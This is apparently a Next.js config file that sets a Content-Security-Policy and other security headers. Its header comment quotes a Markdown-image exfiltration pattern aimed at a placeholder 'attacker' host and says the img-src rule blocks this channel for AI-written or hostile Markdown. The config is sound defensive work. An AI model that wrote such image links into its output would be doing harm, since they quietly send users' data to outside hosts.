import type { NextConfig } from "next";

/**
 * Content-Security-Policy for app pages. Only directives that cannot break
 * Clerk, Stripe redirects, KaTeX, Mermaid or Next's inline scripts (no
 * script-src/style-src here):
 * - frame-src: iframes, and any navigation an embedded frame makes of itself,
 *   may only load our own origin (/embed/react) plus the hosts Clerk's own CSP
 *   helper allows (Cloudflare Turnstile, Stripe.js frames). A react_artifact
 *   can therefore not navigate its iframe to an external page.
 * - frame-ancestors 'self': same as X-Frame-Options SAMEORIGIN.
 * - object-src 'none', base-uri 'self': no plugins, no <base> hijacking.
 * - img-src: images may come only from our own origin, inline data:/blob:
 *   URLs, Clerk's avatar/logo host (the img-src of Clerk's own CSP helper,
 *   @clerk/nextjs content-security-policy.js), and the assets bucket that
 *   /api/asset/:id 302-redirects to (a signed storage.googleapis.com URL).
 *   An image URL is a request the page makes by itself, so this closes the
 *   "![](https://attacker/?data=…)" exfiltration channel for AI-written or
 *   hostile Markdown (the renderer also refuses such images, see
 *   src/lib/markdown-images.ts). The bucket is scoped by path when
 *   ASSETS_BUCKET is known at build time (the Docker build passes it); CSP
 *   ignores paths after a redirect, so the signed URL still matches, while a
 *   direct link to someone else's bucket does not.
 * /embed/* is excluded: /embed/react sets its own stricter nonce CSP.
 */
const ASSETS_BUCKET = process.env.ASSETS_BUCKET?.trim();
const ASSET_IMG_SOURCE =
  ASSETS_BUCKET && /^[a-z0-9][a-z0-9._-]{1,220}$/.test(ASSETS_BUCKET)
    ? `https://storage.googleapis.com/${ASSETS_BUCKET}/`
    : "https://storage.googleapis.com";

const APP_CSP = [
  "frame-src 'self' https://challenges.cloudflare.com https://js.stripe.com https://*.js.stripe.com https://hooks.stripe.com",
  `img-src 'self' data: blob: https://img.clerk.com ${ASSET_IMG_SOURCE}`,
  "frame-ancestors 'self'",
  "object-src 'none'",
  "base-uri 'self'",
].join("; ");

const nextConfig: NextConfig = {
  // Emit a self-contained server (.next/standalone) for the Docker/Cloud Run image.
  output: "standalone",
  // The Prisma client + query-engine binary live under src/generated/prisma.
  // Force them into every server trace so the engine ships in the standalone
  // output (otherwise Prisma fails at runtime with "engine not found").
  outputFileTracingIncludes: {
    "/**": ["./src/generated/prisma/**/*"],
    // Document extraction runs in a child process started from these plain
    // .mjs files at <cwd>/src/lib/import (src/lib/import/extract.ts). They
    // are not bundled, so list them; their packages (fflate, unpdf) are
    // traced through serverExternalPackages below.
    "/api/import/syllabus": ["./src/lib/import/extract-core.mjs", "./src/lib/import/extract-child.mjs"],
    "/api/materials": ["./src/lib/import/extract-core.mjs", "./src/lib/import/extract-child.mjs"],
  },
  // Pin the workspace root to this folder so Next ignores stray lockfiles
  // elsewhere on the machine (silences the inferred-root warning).
  turbopack: {
    root: __dirname,
  },
  // PDF.js (inside unpdf) and fflate are loaded by Node at runtime rather
  // than bundled: the extraction child process (src/lib/import/extract-child.mjs)
  // imports them from node_modules, so output tracing must ship their files
  // in standalone.
  serverExternalPackages: ["unpdf", "fflate"],
  experimental: {
    // Syllabus uploads may be up to 10 MB plus multipart overhead; the proxy
    // buffers request bodies and would otherwise cut them off at 10 MB.
    proxyClientMaxBodySize: "11mb",
    serverActions: {
      // Autosave sends the whole workspace document. Workspaces may be up to
      // 2 MB (MAX_WORKSPACE_BYTES, the same cap as agent results), so leave
      // headroom for the action's argument encoding. The store enforces the
      // 2 MB cap itself and the editor warns before sending anything larger.
      bodySizeLimit: "3mb",
    },
  },
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          // SAMEORIGIN (not DENY): /embed/react is iframed by our own pages.
          { key: "X-Frame-Options", value: "SAMEORIGIN" },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
          {
            key: "Strict-Transport-Security",
            value: "max-age=31536000; includeSubDomains",
          },
          {
            key: "Permissions-Policy",
            value: "camera=(), microphone=(), geolocation=(), payment=()",
          },
        ],
      },
      {
        source: "/:path((?!embed(?:/|$)).*)",
        headers: [{ key: "Content-Security-Policy", value: APP_CSP }],
      },
    ];
  },
};

export default nextConfig;
